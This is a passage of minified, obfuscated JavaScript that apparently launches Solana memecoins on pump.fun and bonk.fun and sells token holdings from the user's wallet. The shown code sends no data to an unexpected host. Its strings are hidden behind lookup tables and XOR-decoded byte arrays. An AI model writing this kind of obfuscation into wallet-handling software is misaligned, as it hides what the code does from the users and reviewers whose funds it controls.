              (n["image/webp"] = e(B));
            return n[t] || "png";
          },
          I = x[E(a)](KR, i(o)),
          S = x[E(u)](KR, x.Dpapd),
          _ = Xg.getInstance().getToken(),
          T = await VR(r, I, o, _);
        if (!T || 0 === T.length)
          return (
            Bg(x[E(302)](x.bTeGb, e) + ".fun", E(267)),
            e === E(305) ? await XR(t) : await x[E(214)](ZR, t)
          );
        const P = x.jgAfp(GR, T),
          R = {};
        (R.name = t.coinName),
          (R[E(c)] = t[E(l)]),
          (R.description = null),
          (R.image = P),
          (R.showName = "true"),
          (R[E(d)] = "https://" + e + ".fun");
        const O = R;
        t[E(f)] && (O.twitter = t.twitterUrl),
          t.websiteUrl && (O.website = t.websiteUrl);
        const M = {};
        M[E(h)] = x.IkqIY;
        const L = new Blob([JSON.stringify(O)], M),
          N = await x[E(p)](VR, L, S, E(m) + "n/json", _);
        if (!N || 0 === N[E(263)])
          return (
            x[E(304)](
              Bg,
              E(g) + E(y) + "ed, falling back to " + e + ".fun",
              x[E(w)]
            ),
            x[E(b)](e, x[E(v)]) ? await XR(t) : await ZR(t)
          );
        const D = x[E(A)](GR, N),
          U = {};
        (U.name = t[E(k)]), (U[E(l)] = t.ticker), (U.uri = D);
        return U;
      } catch (P) {
        return (
          P instanceof Error
            ? P[E(I)]
            : x[E(S)](typeof P, E(_)) ||
              (P && typeof P === E(T) && JSON[E(266)](P)),
          null
        );
      }
    };
  async function XR(t) {
    const e = 222,
      n = 301,
      r = 195,
      o = 252,
      i = 233,
      s = 226,
      a = 246,
      u = 249,
      c = 278,
      l = 305,
      d = 293,
      f = 275,
      h = 246,
      p = LR,
      m = {
        NoFBJ: function (t, e) {
          return t(e);
        },
        nbQTR: function (t, e, n) {
          return t(e, n);
        },
        jlvSP: "twitter",
        WBmEK: "showName",
        GhhWY: p(206),
        iWXjn: "https://pu" + p(218) + p(239),
        WSzhm: p(e),
        IWJZc: function (t, e, n) {
          return t(e, n);
        },
        EjaXT: function (t, e) {
          return t === e;
        },
        acmiB: "object",
      };
    try {
      const e = await m[p(n)](HP, t["selectedIm" + p(r)]),
        g = (await m.nbQTR(TR, e, zR)) ?? e,
        y = new FormData();
      y.append(p(o), g),
        y[p(i)](p(s), t.coinName),
        y.append("symbol", t[p(a)]),
        y.append(m[p(u)], t[p(c)]),
        y[p(233)](m.jlvSP, t.websiteUrl),
        y.append(m.WBmEK, m.GhhWY);
      const w = await fetch(m.iWXjn, { method: m.WSzhm, body: y });
      if (!w) return await m.IWJZc(HR, t, p(l));
      const b = await w[p(291)]();
      if (!b || !b[p(d) + "i"]) return await HR(t, "pump");
      const v = {};
      (v.name = t[p(f)]), (v.ticker = t[p(h)]), (v.uri = b[p(d) + "i"]);
      return v;
    } catch (g) {
      return (
        g instanceof Error
          ? g.message
          : m.EjaXT(typeof g, "string") ||
            (g && m.EjaXT(typeof g, m.acmiB) && JSON.stringify(g)),
        null
      );
    }
  }
  async function ZR(t) {
    const e = 228,
      n = 274,
      r = 198,
      o = 235,
      i = 222,
      s = 202,
      a = 279,
      u = 201,
      c = 270,
      l = 303,
      d = 237,
      f = 297,
      h = 275,
      p = 278,
      m = 263,
      g = 226,
      y = 246,
      w = 277,
      b = LR,
      v = {
        UVflA: function (t, e, n) {
          return t(e, n);
        },
        EnOHD: b(e) + "t-storage.letsbonk22" + b(n) + b(229) + "img",
        NDquU: function (t, e) {
          return t === e;
        },
        byXWt: b(e) + b(r) + b(o) + b(n) + "ev/upload/meta",
        GcFgU: b(i),
        urzQT: "https://bonk.fun",
        ofWzT: b(s) + "ror",
        fHokv: "string",
        sEyhc: b(a),
      };
    try {
      const e = await HP(t[b(u) + b(195)]),
        n = await TR(e, zR),
        r = new FormData();
      r.append(b(c), n);
      const o = {};
      (o.method = b(i)), (o[b(212)] = r);
      const s = await v.UVflA(fetch, v.EnOHD, o);
      let a = await s[b(l)]();
      if (!a || v.NDquU(a.length, 0)) return await HR(t, "bonk");
      const w = {};
      w["Content-Type"] = b(d) + b(f);
      const A = await v.UVflA(fetch, v.byXWt, {
        method: v.GcFgU,
        headers: w,
        body: JSON.stringify({
          createdOn: v.urzQT,
          image: a,
          name: t[b(h)],
          symbol: t.ticker,
          twitter: t[b(p)],
          website: t.websiteUrl,
        }),
      });
      let k = await A.text();
      if (!k || v.NDquU(k[b(m)], 0)) return await v.UVflA(HR, t, "bonk");
      const I = {};
      (I[b(g)] = t.coinName), (I.ticker = t[b(y)]), (I.uri = k);
      return I;
    } catch (A) {
      return (
        v[b(w)],
        A instanceof Error
          ? A.message
          : typeof A === v.fHokv ||
            (A && typeof A === v.sEyhc && JSON.stringify(A)),
        null
      );
    }
  }
  const JR = (t, e = 2e5) => {
      const n = LR,
        r = {
          NhnHI: function (t, e) {
            return t / e;
          },
        },
        o = r,
        i = BigInt(1e9),
        s = BigInt(e),
        a = Math.ceil(1e6 * t),
        u = (o[n(200)](BigInt(a) * i, BigInt(1e6)) * BigInt(1e6)) / s;
      return new Zn(u);
    },
    YR = async (t, e, n) => {
      const r = 219,
        o = 244,
        i = 232,
        s = 266,
        a = LR,
        u = {};
      (u[a(231)] = "string"),
        (u.rQmzU = function (t, e) {
          return t === e;
        }),
        (u[a(r)] = "object");
      const c = u;
      try {
        if (!Zg[a(o) + "e"]().getSettings()) {
          const t = { msg: "Failed to fetch settings" };
          return (t[a(i)] = ![]), t;
        }
        if ("pump" === n) {
          const { msg: n, success: r } = await (async (t, e) => {
              var n, r;
              const o = 184,
                i = 208,
                s = 227,
                a = 183,
                u = 163,
                c = 194,
                l = 185,
                d = 228,
                f = 215,
                h = 216,
                p = 165,
                m = 187,
                g = 223,
                y = 189,
                w = 181,
                b = 228,
                v = 180,
                A = 217,
                k = 217,
                I = 151,
                S = 217,
                _ = 221,
                T = by,
                C = {
                  GDcMT: function (t, e) {
                    return t < e;
                  },
                  PxLVh: function (t, e) {
                    return t * e;
                  },
                  VEAfQ: function (t, e) {
                    return t ^ e;
                  },
                  cayNw: function (t, e) {
                    return t & e;
                  },
                  IicWm: function (t, e) {
                    return t >>> e;
                  },
                  gBjjC: function (t, e) {
                    return t * e;
                  },
                  MpNPb: function (t, e) {
                    return t % e;
                  },
                  UmUOH: function (t, e) {
                    return t ^ e;
                  },
                  iuvQH: function (t, e) {
                    return t(e);
                  },
                  OiRuu: function (t, e) {
                    return t > e;
                  },
                  KgzPl: T(154),
                  ovJet: function (t, e, n, r, o, i) {
                    return t(e, n, r, o, i);
                  },
                };
              if (e)
                return {
                  msg: (function () {
                    let t;
                    return function () {
                      const e = by;
                      if (!t) {
                        const n = new Uint8Array([
                            218, 204, 42, 88, 254, 153, 34, 73, 231, 213, 41,
                            85, 183, 208, 53, 12, 244, 214, 43, 69, 249, 222,
                            102, 95, 248, 214, 40, 13,
                          ]),
                          r = 742832535,
                          o = new Uint8Array(n[e(S)]);
                        for (let t = 0; C.GDcMT(t, n.length); t++) {
                          const i = (r >>> C.PxLVh(t % 4, 8)) & 255;
                          o[t] = C[e(_)](n[t], i);
                        }
                        t = new TextDecoder().decode(o);
                      }
                      return t;
                    };
                  })()(),
                  success: ![],
                };
              const B = Xg[T(o) + "e"]();
              if (!B["isUserAuth" + T(i)]())
                return {
                  msg: (function () {
                    const t = 204;
                    let e;
                    return function () {
                      const n = by;
                      if (!e) {
                        const r = new Uint8Array([
                            196, 202, 35, 94, 177, 215, 41, 88, 177, 216, 51,
                            88, 249, 220, 40, 88, 248, 218, 39, 88, 244, 221,
                          ]),
                          o = 742832529,
                          i = new Uint8Array(r.length);
                        for (let t = 0; t < r.length; t++) {
                          const e = (o >>> ((t % 4) * 8)) & 255;
                          i[t] = r[t] ^ e;
                        }
                        e = new TextDecoder()[n(t)](i);
                      }
                      return e;
                    };
                  })()(),
                  success: ![],
                };
              const E = Jg[T(o) + "e"](),
                x = E.getWallet();
              if (!x)
                return {
                  msg: (function () {
                    const t = {
                      YuWZL: function (t, e) {
                        return t ^ e;
                      },
                    };
                    let e;
                    return function () {
                      const n = by;
                      if (!e) {
                        const r = new Uint8Array([
                            221, 214, 102, 91, 242, 213, 42, 73, 231, 153, 34,
                            73, 231, 220, 37, 88, 246, 221,
                          ]),
                          o = 742832531,
                          i = new Uint8Array(r[n(A)]);
                        for (let e = 0; e < r[n(k)]; e++) {
                          const s = (o >>> ((e % 4) * 8)) & 255;
                          i[e] = t[n(I)](r[e], s);
                        }
                        e = new TextDecoder().decode(i);
                      }
                      return e;
                    };
                  })()(),
                  success: ![],
                };
              const P = Zg.getInstance().getSettings();
              P &&
                ((vy.priorityFeeUnits = C[T(232)](Ay, P.priorityFee)),
                (vy[T(s)] = P[T(227)])),
                (vy[T(a) + T(u)] = C.OiRuu(
                  C.iuvQH(parseFloat, t[T(c) + "uidity"]),
                  0
                )
                  ? new Xn.BN(
                      C.gBjjC(C.iuvQH(parseFloat, t["initialLiq" + T(l)]), 1e9)
                    )
                  : new Xn.BN(0));
              const R = await (null == (n = Og.getRpcClient())
                ? void 0
                : n[T(d)](x.publicKey));
              if (
                !R ||
                R <
                  parseFloat(t.initialLiquidity) +
                    (null == P ? void 0 : P[T(f) + "e"]) +
                    0.03
              ) {
                const e = {};
                return (
                  (e[T(h)] =
                    T(192) +
                    "nt balance" +
                    T(p) +
                    " to have " +
                    t[T(194) + "uidity"] +
                    T(m) +
                    "L"),
                  (e.success = ![]),
                  e
                );
              }
              let O = E.generateKeyPair();
              const M = await HR(t, C.KgzPl);
              if (!M)
                return {
                  msg: (function () {
                    const t = 217;
                    let e;
                    return function () {
                      const n = by;
                      if (!e) {
                        const r = new Uint8Array([
                            215, 216, 47, 64, 244, 221, 102, 88, 254, 153, 54,
                            94, 244, 201, 39, 94, 244, 153, 50, 67, 250, 220,
                            40, 12, 245, 216, 50, 77,
                          ]),
                          o = 742832529,
                          i = new Uint8Array(r[n(t)]);
                        for (let t = 0; t < r.length; t++) {
                          const e = C.cayNw(
                            C.IicWm(o, C.gBjjC(C.MpNPb(t, 4), 8)),
                            255
                          );
                          i[t] = C.UmUOH(r[t], e);
                        }
                        e = new TextDecoder().decode(i);
                      }
                      return e;
                    };
                  })()(),
                  success: ![],
                };
              const L = B.getSDK(),
                N = B[T(g) + T(y)](),
                { msg: D, success: U } = await C.ovJet(ky, M, N, L, O, x);
              await (null == (r = Og[T(w) + "nt"]())
                ? void 0
                : r[T(b)](x.publicKey));
              const q = {};
              return (q[T(216)] = D), (q[T(v)] = U), q;
            })(t, e),
            o = {};
          return (o[a(220)] = n), (o.success = r), o;
        }
        {
          const { msg: n, success: r } = await (async (t, e) => {
              var n, r;
              const o = 130,
                i = 209,
                s = 203,
                a = 158,
                u = 165,
                c = 148,
                l = 174,
                d = 126,
                f = 168,
                h = 173,
                p = 173,
                m = 208,
                g = 131,
                y = 167,
                w = 195,
                b = 205,
                v = 186,
                A = 149,
                k = 213,
                I = 190,
                S = 198,
                _ = 131,
                T = 146,
                C = 171,
                B = 125,
                E = 139,
                x = 123,
                P = 183,
                R = 160,
                O = 179,
                M = 176,
                L = 162,
                N = 142,
                D = 140,
                U = 210,
                q = 121,
                W = 175,
                z = 217,
                K = 188,
                F = 211,
                j = 142,
                G = 217,
                V = 204,
                H = 211,
                X = 170,
                Z = RP,
                J = {
                  evXGY: function (t, e) {
                    return t % e;
                  },
                  WOEhK: function (t, e) {
                    return t & e;
                  },
                  xJjqv: function (t, e) {
                    return t >>> e;
                  },
                  wAuup: function (t, e) {
                    return t * e;
                  },
                  hgFhk: function (t, e) {
                    return t % e;
                  },
                  vMeXX: function (t, e) {
                    return t % e;
                  },
                  HQceH: function (t, e) {
                    return t ^ e;
                  },
                  WlkYV: function (t, e) {
                    return t % e;
                  },
                  jtRSF: function (t, e) {
                    return t ^ e;
                  },
                  ngeeM: function (t, e) {
                    return t < e;
                  },
                  gkZyX: function (t, e) {
                    return t & e;
                  },
                  EhcHj: function (t, e) {
                    return t >>> e;
                  },
                  ZvaAd: function (t, e) {
                    return t >>> e;
                  },
                  RrhNw: function (t, e) {
                    return t * e;
                  },
                  jgejK: function (t, e) {
                    return t ^ e;
                  },
                  uyvlh: function (t, e) {
                    return t > e;
                  },
                  jiPbJ: function (t, e) {
                    return t(e);
                  },
                  WFPwM: function (t, e) {
                    return t === e;
                  },
                  UTVvN: function (t, e) {
                    return t < e;
                  },
                  Zgsmm: function (t, e) {
                    return t + e;
                  },
                  iCXjK: function (t, e) {
                    return t !== e;
                  },
                };
              try {
                if (e)
                  return {
                    msg: (function () {
                      const t = 142,
                        e = function (t, e) {
                          return J[DP(X)](t, e);
                        },
                        n = function (t, e) {
                          return t ^ e;
                        };
                      let r;
                      return function () {
                        const o = DP;
                        if (!r) {
                          const i = new Uint8Array([
                              60, 25, 74, 129, 24, 76, 66, 144, 1, 0, 73, 140,
                              81, 27, 79, 153, 29, 76, 68, 144, 81, 15, 73, 152,
                              24, 2, 65, 213, 2, 3, 73, 155, 80,
                            ]),
                            s = -182031247,
                            a = new Uint8Array(i[o(t)]);
                          for (let t = 0; t < i.length; t++) {
                            const r = (s >>> (8 * e(t, 4))) & 255;
                            a[t] = n(i[t], r);
                          }
                          r = new TextDecoder().decode(a);
                        }
                        return r;
                      };
                    })()(),
                    success: ![],
                  };
                const R = Xg.getInstance();
                if (!R[Z(182) + Z(193)]())
                  return {
                    msg: (function () {
                      let t;
                      return function () {
                        const e = DP;
                        if (!t) {
                          const n = new Uint8Array([
                              38, 31, 67, 135, 83, 2, 73, 129, 83, 13, 83, 129,
                              27, 9, 72, 129, 26, 15, 71, 129, 22, 8,
                            ]),
                            r = -182031245,
                            o = new Uint8Array(n[e(j)]);
                          for (let t = 0; t < n.length; t++) {
                            const i = J[e(G)](
                              J.xJjqv(r, J[e(133)](J[e(V)](t, 4), 8)),
                              255
                            );
                            o[t] = n[t] ^ i;
                          }
                          t = new TextDecoder()[e(H)](o);
                        }
                        return t;
                      };
                    })()(),
                    success: ![],
                  };
                const O = Jg.getInstance(),
                  M = O[Z(o)]();
                if (!M)
                  return {
                    msg: (function () {
                      const t = 217;
                      let e;
                      return function () {
                        const n = DP;
                        if (!e) {
                          const r = new Uint8Array([
                              63, 3, 6, 130, 16, 0, 74, 144, 5, 76, 66, 144, 5,
                              9, 69, 129, 20, 8,
                            ]),
                            o = -182031247,
                            i = new Uint8Array(r.length);
                          for (let e = 0; e < r.length; e++) {
                            const s = J[n(t)](
                              J.xJjqv(o, 8 * J.vMeXX(e, 4)),
                              255
                            );
                            i[e] = J.HQceH(r[e], s);
                          }
                          e = new TextDecoder().decode(i);
                        }
                        return e;
                      };
                    })()(),
                    success: ![],
                  };
                const Y = Zg.getInstance()[Z(i) + "s"]();
                if (
                  (Y &&
                    ((UP[Z(s) + Z(a)] = JR(Y[Z(203) + "e"])),
                    (UP[Z(u)] = Y.slippage)),
                  (UP[Z(c) + Z(l)] = J.uyvlh(
                    J[Z(d)](parseFloat, t[Z(f) + Z(h)]),
                    0
                  )
                    ? new Zn(
                        Math.floor(1e9 * parseFloat(t["initialLiq" + Z(p)]))
                      )
                    : new Zn(0)),
                  J.WFPwM(UP.solAmountUnits, 0))
                )
                  return {
                    msg: (function () {
                      let t;
                      return function () {
                        const e = DP;
                        if (!t) {
                          const n = new Uint8Array([
                              53, 3, 72, 158, 87, 8, 73, 144, 4, 76, 72, 154, 3,
                              76, 71, 153, 27, 3, 81, 213, 20, 30, 67, 148, 3,
                              5, 72, 146, 87, 92, 6, 166, 56, 32, 6, 150, 24, 5,
                              72, 134,
                            ]),
                            r = -182031241,
                            o = new Uint8Array(n.length);
                          for (let t = 0; t < n.length; t++) {
                            const i = J[e(z)](
                              J[e(K)](r, 8 * J.WlkYV(t, 4)),
                              255
                            );
                            o[t] = J.jtRSF(n[t], i);
                          }
                          t = new TextDecoder()[e(F)](o);
                        }
                        return t;
                      };
                    })()(),
                    success: ![],
                  };
                const Q = await (null == (n = Og.getRpcClient())
                  ? void 0
                  : n[Z(m) + "alance"](M[Z(g)]));
                if (
                  !Q ||
                  J[Z(y)](
                    Q,
                    J[Z(w)](
                      parseFloat(t[Z(168) + "uidity"]) +
                        (null == Y ? void 0 : Y.priorityFee),
                      0.018
                    )
                  )
                ) {
                  const e = {};
                  return (
                    (e.msg =
                      "Insufficie" +
                      Z(b) +
                      Z(v) +
                      Z(A) +
                      t.initialLiquidity +
                      Z(k) +
                      "L"),
                    (e.success = ![]),
                    e
                  );
                }
                if (((zP = await PP(M, R["getConnect" + Z(224)]())), !zP))
                  return {
                    msg: (function () {
                      const t = 142,
                        e = 211;
                      let n;
                      return function () {
                        const r = DP;
                        if (!n) {
                          const o = new Uint8Array([
                              55, 13, 79, 153, 20, 8, 6, 129, 30, 76, 79, 155,
                              24, 24, 79, 148, 29, 5, 92, 144, 81, 62, 71, 140,
                              21, 5, 83, 152, 80,
                            ]),
                            i = -182031247,
                            s = new Uint8Array(o.length);
                          for (let e = 0; J[r(162)](e, o[r(t)]); e++) {
                            const t = J.gkZyX(
                              J.EhcHj(i, J.wAuup(J[r(143)](e, 4), 8)),
                              255
                            );
                            s[e] = o[e] ^ t;
                          }
                          n = new TextDecoder()[r(e)](s);
                        }
                        return n;
                      };
                    })()(),
                    success: ![],
                  };
                const $ = await zP[Z(I)].getAccountInfo(WP);
                if (!$)
                  return {
                    msg: (function () {
                      const t = {
                        EYXOr: function (t, e) {
                          return J.gkZyX(t, e);
                        },
                        qduzd: function (t, e) {
                          return t * e;
                        },
                        APSJH: function (t, e) {
                          return t ^ e;
                        },
                      };
                      let e;
                      return function () {
                        const n = DP;
                        if (!e) {
                          const r = new Uint8Array([
                              63, 13, 83, 155, 16, 4, 86, 148, 23, 76, 69, 154,
                              29, 10, 79, 146, 83, 2, 73, 129, 83, 10, 73, 128,
                              29, 8,
                            ]),
                            o = -182031245,
                            i = new Uint8Array(r.length);
                          for (let e = 0; e < r.length; e++) {
                            const s = t[n(q)](o >>> t[n(W)](e % 4, 8), 255);
                            i[e] = t.APSJH(r[e], s);
                          }
                          e = new TextDecoder().decode(i);
                        }
                        return e;
                      };
                    })()(),
                    success: ![],
                  };
                const tt = lP.decode($.data);
                await O.getVanity(
                  (function () {
                    const t = Z,
                      e = {
                        GryQe: function (t, e) {
                          return t * e;
                        },
                        xZcDz: function (t, e) {
                          return t % e;
                        },
                      };
                    e[t(144)] = function (t, e) {
                      return t ^ e;
                    };
                    const n = e;
                    let r;
                    return function () {
                      const e = t;
                      if (!r) {
                        const t = new Uint8Array([19, 3, 72, 158]),
                          o = -182031247,
                          i = new Uint8Array(t.length);
                        for (let r = 0; r < t[e(N)]; r++) {
                          const s = (o >>> n[e(D)](n[e(U)](r, 4), 8)) & 255;
                          i[r] = n.KoZiB(t[r], s);
                        }
                        r = new TextDecoder().decode(i);
                      }
                      return r;
                    };
                  })()()
                );
                let et = O[Z(S)]();
                const nt = await HR(
                    t,
                    (function () {
                      let t;
                      return function () {
                        const e = DP;
                        if (!t) {
                          const n = new Uint8Array([29, 3, 72, 158]),
                            r = -182031233,
                            o = new Uint8Array(n.length);
                          for (let t = 0; J[e(L)](t, n.length); t++) {
                            const i = 255 & J.ZvaAd(r, J[e(178)](t % 4, 8));
                            o[t] = J.jgejK(n[t], i);
                          }
                          t = new TextDecoder().decode(o);
                        }
                        return t;
                      };
                    })()()
                  ),
                  rt = ![],
                  ot = {
                    programId: qP,
                    mintA: et[Z(_)],
                    decimals: 6,
                    name: nt.name,
                    symbol: nt.ticker,
                    migrateType: "cpmm",
                    uri: nt.uri,
                    platformId: new Xi(
                      "FfYek5vEz2" + Z(138) + "2oa6EphsvX" + Z(T) + Z(137)
                    ),
                    configId: WP,
                    configInfo: tt,
                    mintBDecimals: 9,
                    txVersion: uS.V0,
                    slippage: new Zn(100 * UP.slippage),
                    buyAmount: UP["solAmountU" + Z(l)],
                    createOnly: rt,
                    extraSigners: [et],
                    supply: new Zn(1e15),
                    totalSellA: new Zn(7931e11),
                    feePayer: M.publicKey,
                  },
                  { execute: it } = await zP.launchpad.createLaunchpad(ot),
                  st = { sequentially: !![] };
                st[Z(C) + Z(B)] = !![];
                const at = await it(st),
                  ut = at && at.txIds[0] !== Z(E) && J.iCXjK(at, void 0);
                if (
                  (await (null == (r = Og.getRpcClient())
                    ? void 0
                    : r.getBalance(M[Z(_)])),
                  ut)
                ) {
                  const t = {};
                  return (t.msg = Z(x) + Z(P) + " coin"), (t.success = !![]), t;
                }
                const ct = {};
                return (
                  (ct[Z(120)] = "Failed to create token"),
                  (ct.success = ![]),
                  ct
                );
              } catch (Y) {
                let t = "Unknown er" + Z(R);
                Y instanceof Error
                  ? (t = Y[Z(O)])
                  : J.WFPwM(typeof Y, Z(M))
                  ? (t = Y)
                  : Y && "object" == typeof Y && (t = JSON.stringify(Y));
                const e = {};
                return (e[Z(120)] = "" + t), (e.success = ![]), e;
              }
            })(t, e),
            o = {};
          return (o.msg = n), (o.success = r), o;
        }
      } catch (l) {
        let t = a(202) + "ror";
        l instanceof Error
          ? (t = l.message)
          : typeof l === c.EkhcW
          ? (t = l)
          : l && c.rQmzU(typeof l, c.ZJuzL) && (t = JSON[a(s)](l));
        const e = {};
        return (e.msg = "" + t), (e.success = ![]), e;
      }
    },
    QR = async (t, e) => {
      const n = 295,
        r = 305,
        o = 307,
        i = 307,
        s = 289,
        a = 224,
        u = 221,
        c = 197,
        l = LR,
        d = {
          voTZy: function (t, e) {
            return t === e;
          },
          LwcTA: "success",
          bplcS: function (t, e, n) {
            return t(e, n);
          },
          LNMfR: function (t, e) {
            return t instanceof e;
          },
          iqdfo: function (t, e) {
            return t === e;
          },
          oERgY: l(292),
          RnMyK: function (t, e) {
            return t === e;
          },
        };
      try {
        if (d[l(n)](e, l(r))) {
          const { msg: e, success: n } = await Iy(t);
          Bg(e, n ? d.LwcTA : l(o));
        } else {
          const { msg: e, success: n } = await (async (t) => {
            var e;
            const n = 160,
              r = 193,
              o = 135,
              i = 198,
              s = 214,
              a = 131,
              u = 151,
              c = 131,
              l = 122,
              d = 218,
              f = 209,
              h = 158,
              p = 151,
              m = 181,
              g = 201,
              y = 184,
              w = 190,
              b = 177,
              v = 191,
              A = 171,
              k = 222,
              I = 131,
              S = 215,
              _ = 223,
              T = 179,
              C = 169,
              B = 196,
              E = 225,
              x = 220,
              P = RP,
              R = {
                AygUG: function (t, e) {
                  return t >>> e;
                },
                qlqfY: function (t, e) {
                  return t * e;
                },
                YDVtA: function (t, e) {
                  return t ^ e;
                },
                yMOKF: function (t, e) {
                  return t < e;
                },
                gQAWc: function (t, e) {
                  return t >>> e;
                },
                KyCMN: function (t, e) {
                  return t & e;
                },
                YEVGP: function (t, e) {
                  return t & e;
                },
                QGLrD: function (t, e, n, r) {
                  return t(e, n, r);
                },
                GgnTa: P(206) + "iled",
                xdYzx: "Unknown er" + P(n),
                KgurQ: function (t, e) {
                  return t === e;
                },
                iUcmF: "string",
              };
            try {
              const n = Xg.getInstance();
              if (!n[P(182) + P(r)]())
                return {
                  msg: (function () {
                    const t = 142,
                      e = 142,
                      n = 166,
                      r = 192;
                    let o;
                    return function () {
                      const i = DP;
                      if (!o) {
                        const s = new Uint8Array([
                            36, 31, 67, 135, 81, 2, 73, 129, 81, 13, 83, 129,
                            25, 9, 72, 129, 24, 15, 71, 129, 20, 8,
                          ]),
                          a = -182031247,
                          u = new Uint8Array(s[i(t)]);
                        for (let t = 0; t < s[i(e)]; t++) {
                          const e = 255 & R[i(n)](a, R[i(r)](t % 4, 8));
                          u[t] = R.YDVtA(s[t], e);
                        }
                        o = new TextDecoder().decode(u);
                      }
                      return o;
                    };
                  })()(),
                  success: ![],
                };
              const T = Jg[P(o) + "e"](),
                C = T[P(130)]();
              if (!C)
                return {
                  msg: (function () {
                    const t = 142,
                      e = 221,
                      n = 211,
                      r = {
                        EgjnP: function (t, e) {
                          return R.qlqfY(t, e);
                        },
                      };
                    let o;
                    return function () {
                      const i = DP;
                      if (!o) {
                        const s = new Uint8Array([
                            61, 3, 6, 130, 18, 0, 74, 144, 7, 76, 66, 144, 7, 9,
                            69, 129, 22, 8,
                          ]),
                          a = -182031245,
                          u = new Uint8Array(s.length);
                        for (let n = 0; n < s[i(t)]; n++) {
                          const t = (a >>> r[i(e)](n % 4, 8)) & 255;
                          u[n] = s[n] ^ t;
                        }
                        o = new TextDecoder()[i(n)](u);
                      }
                      return o;
                    };
                  })()(),
                  success: ![],
                };
              if (!zP && ((zP = await PP(C, n.getConnection())), !zP))
                return {
                  msg: (function () {
                    const t = 142,
                      e = 155,
                      n = 219,
                      r = 211,
                      o = {
                        yPIdG: function (t, e) {
                          return R[DP(x)](t, e);
                        },
                        EmAYb: function (t, e) {
                          return t % e;
                        },
                      };
                    let i;
                    return function () {
                      const s = DP;
                      if (!i) {
                        const a = new Uint8Array([
                            55, 13, 79, 153, 20, 8, 6, 129, 30, 76, 79, 155, 24,
                            24, 79, 148, 29, 5, 92, 144, 81, 62, 71, 140, 21, 5,
                            83, 152, 80,
                          ]),
                          u = -182031247,
                          c = new Uint8Array(a[s(t)]);
                        for (let t = 0; o[s(e)](t, a[s(142)]); t++) {
                          const e = (u >>> (8 * o[s(n)](t, 4))) & 255;
                          c[t] = a[t] ^ e;
                        }
                        i = new TextDecoder()[s(r)](c);
                      }
                      return i;
                    };
                  })()(),
                  success: ![],
                };
              let B = T[P(i)]();
              if (!T[P(s)]() || !B)
                return {
                  msg: (function () {
                    const t = function (t, e) {
                        return R.gQAWc(t, e);
                      },
                      e = function (t, e) {
                        return t % e;
                      };
                    let n;
                    return function () {
                      if (!n) {
                        const r = new Uint8Array([
                            52, 3, 83, 153, 19, 76, 72, 154, 3, 76, 64, 156, 25,
                            8, 6, 129, 24, 7, 67, 155, 89, 66, 25,
                          ]),
                          o = -182031241,
                          i = new Uint8Array(r.length);
                        for (let n = 0; n < r.length; n++) {
                          const s = 255 & t(o, 8 * e(n, 4));
                          i[n] = r[n] ^ s;
                        }
                        n = new TextDecoder().decode(i);
                      }
                      return n;
                    };
                  })()(),
                  success: ![],
                };
              const O = B[P(a)],
                M = await R[P(u)](fl, O, C[P(c)], !![]),
                L = await zP.connection.getTokenAccountBalance(M, "processed");
              if (!L || !L[P(l)])
                return {
                  msg: (function () {
                    const t = function (t, e) {
                      return R.KyCMN(t, e);
                    };
                    let e;
                    return function () {
                      const n = DP;
                      if (!e) {
                        const r = new Uint8Array([
                            37, 3, 77, 144, 31, 76, 71, 150, 18, 3, 83, 155, 5,
                            76, 72, 154, 5, 76, 64, 154, 4, 2, 66,
                          ]),
                          o = -182031247,
                          i = new Uint8Array(r.length);
                        for (let e = 0; e < r.length; e++) {
                          const n = t(o >>> ((e % 4) * 8), 255);
                          i[e] = r[e] ^ n;
                        }
                        e = new TextDecoder()[n(211)](i);
                      }
                      return e;
                    };
                  })()(),
                  success: ![],
                };
              const N = new Zn(L.value.amount),
                D = new Zn(t),
                U = N.mul(D).div(new Zn(100));
              if (U[P(d)]())
                return {
                  msg: (function () {
                    const t = 142,
                      e = 141;
                    let n;
                    return function () {
                      const r = DP;
                      if (!n) {
                        const o = new Uint8Array([
                            32, 9, 74, 153, 83, 13, 75, 154, 6, 2, 82, 213, 26,
                            31, 6, 143, 22, 30, 73,
                          ]),
                          i = -182031245,
                          s = new Uint8Array(o[r(t)]);
                        for (let t = 0; t < o.length; t++) {
                          const n = R[r(e)](i >>> ((t % 4) * 8), 255);
                          s[t] = o[t] ^ n;
                        }
                        n = new TextDecoder().decode(s);
                      }
                      return n;
                    };
                  })()(),
                  success: ![],
                };
              const q = Zg.getInstance()[P(f) + "s"]();
              q &&
                ((UP["priorityFe" + P(h)] = JR(q.priorityFee)),
                (UP.slippage = q.slippage));
              const W = R[P(p)](Zx, qP, O, Bc).publicKey,
                z = {};
              z[P(m)] = W;
              const K = await zP[P(g)][P(y) + P(159)](z),
                F = await zP[P(w)][P(b) + P(159)](K[P(200)]);
              if (!F)
                return {
                  msg: (function () {
                    const t = P,
                      e = {};
                    (e[t(E)] = function (t, e) {
                      return t & e;
                    }),
                      (e[t(207)] = function (t, e) {
                        return t * e;
                      }),
                      (e.cYNbb = function (t, e) {
                        return t ^ e;
                      });
                    const n = e;
                    let r;
                    return function () {
                      if (!r) {
                        const t = new Uint8Array([
                            33, 0, 71, 129, 23, 3, 84, 152, 81, 13, 69, 150, 30,
                            25, 72, 129, 81, 2, 73, 129, 81, 10, 73, 128, 31, 8,
                          ]),
                          e = -182031247,
                          o = new Uint8Array(t.length);
                        for (let r = 0; r < t.length; r++) {
                          const i = n.MuWLl(e >>> n.rMAkT(r % 4, 8), 255);
                          o[r] = n.cYNbb(t[r], i);
                        }
                        r = new TextDecoder().decode(o);
                      }
                      return r;
                    };
                  })()(),
                  success: ![],
                };
              const j = hP.decode(F.data),
                { execute: G } = await zP[P(g)].sellToken({
                  slippage: new Zn(100 * UP.slippage),
                  programId: qP,
                  mintA: O,
                  configInfo: K.configInfo,
                  platformFeeRate: j.feeRate,
                  txVersion: uS.V0,
                  sellAmount: U,
                  feePayer: C.publicKey,
                }),
                V = {};
              (V[P(v) + "firm"] = !![]), (V[P(A) + P(125)] = !![]);
              const H = await G(V),
                X = H && "undefined" !== H.txId && void 0 !== H[P(185)];
              await (null == (e = Og[P(k) + "nt"]())
                ? void 0
                : e.getBalance(C[P(I)]));
              const Z = {};
              return (
                (Z.msg = X ? "Successful" + P(S) + t + "% of tokens" : R.GgnTa),
                (Z[P(_)] = X),
                Z
              );
            } catch (O) {
              let t = R.xdYzx;
              O instanceof Error
                ? (t = O[P(T)])
                : R.KgurQ(typeof O, R[P(C)])
                ? (t = O)
                : O && "object" == typeof O && (t = JSON[P(B)](O));
              const e = {};
              return (e.msg = "" + t), (e.success = ![]), e;
